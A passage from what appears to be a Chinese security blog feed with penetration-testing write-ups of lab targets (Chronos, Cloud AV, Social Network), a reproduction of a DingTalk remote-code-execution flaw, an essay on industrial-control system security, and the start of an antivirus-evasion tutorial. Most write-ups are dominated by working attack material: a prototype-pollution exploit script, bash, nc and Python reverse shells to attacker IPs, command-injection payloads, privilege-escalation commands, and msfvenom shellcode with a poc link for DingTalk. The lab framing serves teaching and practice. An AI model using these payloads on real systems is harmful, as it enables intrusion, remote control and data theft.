<img src="/2022/10/29/CHRONOS/15.png" class title="This is an example image">



<p>进行基础的信息收集，当前为普通用户，服务端用node.js搭建</p>
<img src="/2022/10/29/CHRONOS/16.png" class title="This is an example image">



<p>查看 &#x2F;etc&#x2F;passwd 得到 imera 账号有 bash 权限</p>
<img src="/2022/10/29/CHRONOS/17.png" class title="This is an example image">



<p>home 目录下的 imera 目录有 user.txt文件，但只有其自身有权限</p>
<img src="/2022/10/29/CHRONOS/18.png" class title="This is an example image">



<p><strong>0x07 提权 &amp; 提权</strong></p>
<p>现在的思路是提权，提权思路一般有</p>
<ol>
<li>内核提权，uname -a</li>
<li>suid 权限配置不当，通过执行高权限用户文件得到高权限。</li>
<li>sudo 提权</li>
</ol>
<p>暂时没找到可以利用的，默认命令执行的目录为 &#x2F;opt&#x2F;chronos，看到同级目录下还有个 chronos-v2 目录</p>
<p>又是一个 node.js 服务端，那就找找 node.js 框架漏洞吧</p>
<p>网上找到了node.js的代码注入漏洞，原理是参数污染，利用条件为开启了express-fileupload，并且 parseNested 选项为 true</p>
<img src="/2022/10/29/CHRONOS/19.png" class title="This is an example image">

<p>发现刚好满足条件</p>
<p>根据靶机条件修改EXP端口和IP信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.4/8888 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:7777&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开启 http 服务，把文件上传到靶机，执行反弹 shell</p>
<img src="/2022/10/29/CHRONOS/20.png" class title="This is an example image">

<p>看到反弹了 imera 权限，读取 &#x2F;home&#x2F;imera  的user.txt，这就是个 flag，base64加密，没啥内容。</p>
<img src="/2022/10/29/CHRONOS/21.png" class title="This is an example image">



<p>尝试能否提权到 root</p>
<p>查看拥有 sudo 权限的程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/22.png" class title="This is an example image">

<p>可以看到执行 sudo node 无需密码，那提权思路是用 node 创建一个子进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/23.png" class title="This is an example image">

<p>有 root 权限后在对应目录下找到了另外的flag。</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>BOREDHACKERBLOG: CLOUD AV</title>
    <url>/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254); do sudo arping -c 2 10.0.2.$i; done</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.5</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/03.png" class title="This is an example image">



<p><strong>0x04 堆叠注入</strong></p>
<p>访问Web服务瞧瞧</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/04.png" class title="This is an example image">



<p>有输入框，挂BP抓个包看看</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/05.png" class title="This is an example image">



<p>基本全明文，那把参数替换成特殊字符试试，把键盘上所有的特殊字符做成字典，过一遍看有无报错</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/06.png" class title="This is an example image">



<p>看到报错信息了，在页面上注入查看详细信息。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/07.png" class title="This is an example image">



<p>看到报错信息，是sqlite数据库，连数据库语句都报出来了。</p>
<p>尝试万能密码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; or 1=1--</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/08.png" class title="This is an example image">



<p>猜测功能为输入文件名，调用杀毒程序进行查杀。</p>
<p>系统应该是执行    avscan fileName  类似的命令，尝试堆叠注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello | id</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/09.png" class title="This is an example image">



<p>堆叠注入成功，代表此处存在命令注入。</p>
<p>由上面的服务发现可知，系统存在python2环境，此处可以用Python代码执行反弹shell，但考虑到代码过长，选择另一种更为常见的方式，<strong>nc反弹shell</strong>。</p>
<p>nc常用在反弹shell，它既可以主动发起连接，也可以被动等待连接，常用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主动发起连接,-e参数是指连接交予sh</span></span><br><span class="line">nc ip 4444 -e /bin/sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被动接受连接</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>这里有个需要注意的地方，不同发行版的Linux用的是不同版本的nc，部分nc没有-e参数，不指定权限交予程序。</p>
<p>先尝试用带 e 的命令行注入，无连接反应。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/10.png" class title="This is an example image">

<p>这里介绍一种新思路：</p>
<p>1、受害机通过nc建立一个普通连接<br>2、把第一个连接的输入重定向到受害者本地的&#x2F;bin&#x2F;bash<br>3、把&#x2F;bin&#x2F;bash的输入重定向到另一个nc连接</p>
<p>首先，本地开启两个Nc端口监听</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一个Nc监听，用于执行命令</span></span><br><span class="line">nc -nvlp 3333</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二个Nc监听，用于输入执行结果</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>受害机执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hello为堆叠注入，</span></span><br><span class="line">hello | nc 10.0.2.4 3333 | /bin/bash | nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure>

<p>得到反弹shell，3333端口用于命令输入，4444端口用于结果输出。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/11.png" class title="This is an example image">



<p><strong>0x05 SSH爆破尝试</strong></p>
<p>进行信息收集，看到database.sql文件。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/12.png" class title="This is an example image">

<p>由先前报错可知，采用的是sqlite数据库，转了一圈发现本地没有sqlite环境读取，则把文件下载到本地来读取。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nc进行文件传输</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali进行nc端口监听</span></span><br><span class="line">nc ip 5555 &gt; db.sql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目标机进行nc数据传输</span></span><br><span class="line">nc ip 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 本地读取sqlite文件</span><br><span class="line">sqlite3</span><br><span class="line">.open db.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/13.png" class title="This is an example image">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取当前系统有bash权限的用户</span></span><br><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>

<p>得到 cloudav &amp; scanner。</p>
<p>制作字典尝试爆破SSH。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi user.txt      # cloudav | scanner</span><br><span class="line">vi password.txt  # myinvitecode123 | mysecondinvitecode | cloudavtech | mostsecurescanner</span><br><span class="line">hydra -L user.txt - P pass.txt ssh://ip</span><br></pre></td></tr></table></figure>

<p>结果全部错误，木大。</p>
<p><strong>0x06 命令行提权</strong></p>
<p>直接在反弹shell尝试提权吧。</p>
<p>兜兜转转一圈下来，没发现啥内核提权漏洞。只有用于搭建网站的前后端文件、数据库文件。</p>
<p>这时，习惯用 ls -l 命令的我发现了疑点</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/14.png" class title="This is an example image">



<p>在上个目录下发现了suid属性的文件，所属是root用户，并且其他组用户还有执行权限。</p>
<p><strong>如果用 root 所属的文件创建新的连接，那就是一个root权限的连接。</strong></p>
<p>刚好有个.c的源文件，看看这个文件是干嘛的</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/15.png" class title="This is an example image">



<p>简单来讲就是，执行软件更新命令，那就涉及命令执行，尝试下最开始的堆叠注入吧。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;id | nc 10.0.2.4 6666 | /bin/bash | nc 10.0.2.4 7777&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/16.png" class title="This is an example image">

<p>拿到 root 权限了。</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>BoredHackerBlog: Social Network</title>
    <url>/2022/10/17/BoredHackerBlog-Social-Network/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同一网段的二层主机地址发现</span></span><br><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/arp-scan.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.15</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/nmap.png" class title="This is an example image">



<p><strong>0x03 服务发现</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 10.0.2.15</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/nmap-service.png" class title="This is an example image">



<p><strong>0x04 Web页面探查</strong></p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/main-page.png" class title="This is an example image">

<p>在线留言板，估计应该是通过js实现的数据添加</p>
<p><strong>0x05 路径爬取</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u 10.0.2.15</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/route-brust.png" class title="This is an example image">



<p><strong>0x06 代码注入-反弹shell</strong></p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/admin-page.png" class title="This is an example image">

<p>从前面可知目标机环境为python，因为无回显 ，直接使用反弹shell试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在页面输入</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.0.2.4&quot;</span>,<span class="number">4444</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地开启监听</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/shell.png" class title="This is an example image">



<p><strong>0x07 内网信息收集</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat Dockerfile</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/ls-docker.png" class title="This is an example image">

<p>初步确定为一台docker容器，可运行下面的命令进一步确定</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /.dockerenv</span><br><span class="line">cat /proc/1/cgroup   #包含docker</span><br></pre></td></tr></table></figure>



<p><strong>0x08 内网穿透</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip a #查看ip地址</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/ip-a.png" class title="This is an example image">

<p>发现有内网网段思路有很多，列举几种比较常见的：</p>
<ul>
<li>上线msf、生成python二进制打包elf，或是直接生成elf可执行程序</li>
<li>上线CS，linux上线CS下次再介绍</li>
</ul>
<p>由于这里是打靶，不会过于复杂，就写个简单的脚本扫描了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done #这里省时就扫少点</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/ping.png" class title="This is an example image">



<p><strong>Venom实现内网穿透：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999  #kali:服务器端</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/vemon_server.png" class title="This is an example image">



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span>  <span class="comment">#开启http服务</span></span><br><span class="line">wget http://<span class="number">10.0</span><span class="number">.2</span><span class="number">.4</span>/agent_linux_x64  <span class="comment">#目标机下载客户端程序</span></span><br><span class="line">chmod -x agent_linux_x64  <span class="comment">#赋予可执行权限</span></span><br><span class="line">./agent_linux_x64 -rhost <span class="number">10.0</span><span class="number">.2</span><span class="number">.4</span> -rport <span class="number">9999</span> </span><br></pre></td></tr></table></figure>



<p><strong>Venom本机代理设置:</strong> </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br><span class="line">socks 1080   #启动kali本地的socks代理</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/vemon_socket.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/proxychains4.conf</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/proxychains.png" class title="This is an example image">



<p>完成设置后，就能使用kali本机的工具直接对内网主机进行操作，只需在前缀加上<strong>proxychains</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.1</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/1_nmap_port.png" class title="This is an example image">



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -p22,5000 -Pn -sT -sV 172.17.0.1</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/1_nmap_service.png" class title="This is an example image">



<p>端口服务跟暴露在外网的一样<br>通过配置服务器代理后可直接访问内网地址172.17.0.1</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/browser_proxy.png" class title="This is an example image">



<p>可以看出这个内网地址跟暴露在外网的10.0.2.15开启了相同的服务，判断为同一服务</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/1_main_page.png" class title="This is an example image">



<p>继续第二个内网IP</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/2_nmap_port.png" class title="This is an example image">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p 9200 172.17.0.2</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/2_nmap_service.png" class title="This is an example image">



<p><strong>0x09 ES漏洞利用</strong></p>
<p>本地寻找漏洞库中的利用代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/searchsploit_Elasticsearch.png" class title="This is an example image">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br><span class="line">proxychains python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/2_getshell.png" class title="This is an example image">



<p>oh yes ！再拿到一个shell，再来一波信息收集，看到有个password进去瞧瞧。</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/password.png" class title="This is an example image">



<p>拿去解密，得到 john 密码。PS : 其他账号没什么用。</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/md5.png" class title="This is an example image">



<p><strong>0x10 本地提权</strong></p>
<p>尝试远程登录服务器，只有 john 用户登得上外网的服务器。</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/ssh.png" class title="This is an example image">



<p>不是root权限，查看内核版本为3.13.0-24-generic，这个是比较古老的版本。查找EXP。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit 3.13</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/linux_kernel.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/37292.c .</span><br></pre></td></tr></table></figure>

<p>此处有个坑，查看提权脚本</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/code.png" class title="This is an example image">

<p>常规做法是编译成可执行文件到目标机上执行，但代码里有继续调用本地库的操作，很显然，基本上目标机上是没有这些库的，所以在这里的思路是，稍稍修改下代码，再把对应库文件上传。</p>
<p>操作如下：<br>1、把脚本里对ofs-lib.c操作和判断删除<br>2、把ofs-lib.c和脚本文件上传到目标机完成提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br></pre></td></tr></table></figure>

<p>找到本地的ofs-lib.so文件跟 exp 文件一起上传到目标机</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/ofs-lib.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#目标机赋执行权限，完成提权</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>钉钉RCE反弹shell</title>
    <url>/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p><strong>0x01 影响版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">钉钉版本&lt; 6.3.25-Release.2149108</span><br></pre></td></tr></table></figure>

<p><strong>0x02 复现过程</strong></p>
<p>1、环境说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机:192.168.31.198(Kali Linux)</span><br><span class="line">目标机:192.168.239.135(windows10)</span><br><span class="line">钉钉6.3.5版本下载地址：</span><br><span class="line">https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v6.3.5.11308701.exe</span><br></pre></td></tr></table></figure>

<p>注：此处有个问题，打开旧版钉钉会提示版本过老无法正常登录</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/old.png" class title="This is an example image">

<p>解决办法：<br>在另一台电脑安装最新版的钉钉，打开安装路径，复制staticconfig.xml文件替换到旧版即可，之后正常登录，记得把自动登录勾选上。然后在软件内设置不自动更新，退出后再把原先的配置文件覆盖回来即可解决乱码问题。其实不解决乱码问题也能触发payload。</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/path1.png" class title="This is an example image">

<p>2、msf生成shellcode:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.31</span><span class="number">.198</span> LPORT=<span class="number">8834</span> -f csharp</span><br></pre></td></tr></table></figure>

<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/shellcode.png" class title="This is an example image">

<p>3、替换payload里的shellcode</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">项目地址：https:<span class="comment">//github.com/crazy0x70/dingtalk-RCE</span></span><br><span class="line"></span><br><span class="line">替换项目中test.html中的shellcode，需要替换的位置为</span><br><span class="line">var shellcode=new Uint8Array([<span class="number">0xfc</span>,<span class="number">0xe8</span>,<span class="number">0x8f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x60</span>,<span class="number">0x89</span>,<span class="number">0xe5</span>,<span class="number">0x31</span>,<span class="number">0xd2</span>,<span class="number">0x64</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x0c</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x14</span>,<span class="number">0x0f</span>,<span class="number">0xb7</span>,<span class="number">0x4a</span>,<span class="number">0x26</span>,<span class="number">0x31</span>,<span class="number">0xff</span>,<span class="number">0x8b</span>,<span class="number">0x72</span>,<span class="number">0x28</span>...])</span><br></pre></td></tr></table></figure>

<p>4、msf监听反弹端口</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.31</span><span class="number">.198</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">8834</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/listen.png" class title="This is an example image">

<p>5、开启web服务，构造poc发送给目标机</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/web%E6%9C%8D%E5%8A%A1.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc:dingtalk://dingtalkclient/page/link?url=http://192.168.31.198:8080/dingding.html&amp;pc_slide=true</span><br></pre></td></tr></table></figure>

<p>6、payload触发</p>
<ul>
<li>如果按照上面的方式操作，软件不会乱码，直接发送在聊天框点击触发即可</li>
<li>乱码情况下直接在浏览器访问引导触发也可以</li>
</ul>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/dingtalk.png" class title="This is an example image">

<p>点击打开，kali就能反弹到shell</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/shell.png" class title="This is an example image">

<p><strong>0x03 修复建议</strong></p>
<p>更新到最新版即可</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>国内DCS系统发展现状</title>
    <url>/2022/09/03/%E5%9B%BD%E5%86%85DCS%E7%B3%BB%E7%BB%9F%E5%8F%91%E5%B1%95%E7%8E%B0%E7%8A%B6/</url>
    <content><![CDATA[<p>先简单给各位介绍下DCS系统。DCS系统大多用于工业控制领域，主要用于控制生产制造系统，所体现的是控制功能分散而管理功能集中，属于分布式控制系统。实现集中管理和生产控制器交互，完成生产任务。与信息系统不同的是，在工业控制生产环境，对信息传递的实时性要求非常高，信息的延误可能会导致生产事故，因此多采用局域网通信。DCS系统适用于石油石化、水资源处理（如:污水处理厂）以及工业发电（火电、核电等）。</p>
<p>在DCS系统的应用环境中是用的专用工控协议，很多人对工控协议有所误解，认为在工业控制中所用的专用协议，安全性肯定比常用协议好，其实不然。各种工控协议的设计之初，大多只考虑了生产环境要求的实时性，对安全性考虑得较少。比如我们在日常使用中加密算法，往往在工控协议中就不包含或是极少涉及，因为加密会影响实时性且占用局域网内的资源。工控网中的资源占用导致的后果是十分严重的，可能导致现场生产设备的失控。因此，在DCS系统中所做的安全防护可谓少之又少，近年国家对各种场站做了调查，发现国内百分之九十的DCS都没有做加固。对这些国外进口的设备丝毫不敢动，生怕厂商不给维护，过于依赖后台厂商。</p>
<p>国内工控系统受制于系统厂商。常常表现为，很多事情的落实过度依赖于后台厂家，包括维护、检修、升级、安装安防产品等。</p>
<p>比如说现在国内的DCS系统，几乎全都是国外厂商的、像是ABB、艾默生、福克斯波罗等，这也导致在DCS中做安全防护，像是主机加固等很难推进。因为厂家表示，做了国内的主机加固，出了问题他们厂家概不负责。他们也有所谓的“正当理由”，表示上的安防产品需要通过他们国外厂商的测评(实际上他们可能根本没有所谓的测评机构，往往只是不想让你用)。</p>
<p>但实际上国家对这一块的要求早就相当明确，就拿国网来说，早在2006年的国网1167号文件就有规定，什么样的安全产品才能进入生产控制大区，即必须通过国家委托测评的产品就能够部署在生产大区，而南网2015年通用技术规范也有相关的要求。更关键的一点是，2015年能源局36号文的出台，更是提出了生产控制大区主机操作系统应当进行安全加固，原先做加固只能根据用户的需要和自身的安全意识高低决定做不做，而现在已经是有国家明文规定了。15年之前的主机加固推进相对艰难，但即便在现在能源局36号文出台6年后，仍旧有不少厂站主机系统没有做加固。面对这种情况，国外厂商也变着法子满足要求，自身系统附带主机加固软件，当然他们仅仅是为了满足国内文件要求，变相让我们不做国内的加固。这种厂商自己也做加固的行为从两方面就可以驳倒：</p>
<ol>
<li>国家文件早有规定什么样的安全产品才能进入生产控制大区，而不是说厂家自身的产品就是合规达标的，也许厂家自身的加固产品不会导致系统宕机，但没有通过测评的产品都是不合规达标的，而国外产品基本上都是没有通过国内测评。</li>
<li>做主机加固的目的就是为了防止系统本身或外来攻击造成的核心业务非法中断、核心数据非法篡改的问题。主机加固也是为了防止厂家系统的一些漏洞问题，如果厂商自己做，那就相对于又是裁判员，又是参赛员，这就没有意义了，同时这一块也是为了防止国外的技术封锁，在系统中设下后门程序等。</li>
</ol>
<p>鉴于以上两点可以总结出，应该对生产控制大区主机操作系统进行安全加固，且所采用的产品应该通过国家指定机构的委托测评。在工控安全这一块不应过于受制于系统厂商。目前国家对工控安全日益重视，但现实是国内电厂、电网的安全意识仍旧低下。</p>
<p>其实，十几年前有一段时间，国内新华集团制造的DCS系统在国内市场占有率相当可观，DEH国内占有率更是高达80%。而后来出于对国际大公司的信任，大大低估了“国际游戏”的玩法。想利用通过和GE公司的合作打开国外市场，殊不知对方早已虎视眈眈，被并购的决定直接就是投怀送抱，导致了封锁了国产DCS系统的发展，并被巨额索赔，直接导致了到目前为止新华集团的DCS系统在国内已经鲜有人知了。</p>
<p>其实近些年国外企业打压手段已经逐渐浮出水面，恶意投资然后雪藏，或是投资傀儡公司以竞争名义进行打压等。19年的《美国陷阱》就已经揭露了GE如何在美国政府扶持下恶意收购法国的阿尔斯通，以现在的角度来看，这场“战争”早在几十年前就开始了，这场没有硝烟的战争终将会持续，并极大可能成为以后国际公司新的战场。最后借用《美国陷阱》中的一句话，阿尔斯通不是第一家被美国恶意收购的公司，也不会是最后一家。</p>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀对抗之源码免杀</title>
    <url>/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<p><strong>0x01 免杀分类</strong></p>
<p>渗透测试中常需要免杀马，这块的内容交叉且形式多样。常见的免杀方式，源码混淆、DLL文件替换、文件修改、加壳、花指令免杀、签名等。免杀的内容比较偏向破解、反编译范畴的安全研究，也是武器库中的必不可少的部分。本文章是系列教程，各种免杀方式都会涉及，本次分享的是源码免杀。</p>
<p><strong>0x02 源码免杀</strong></p>
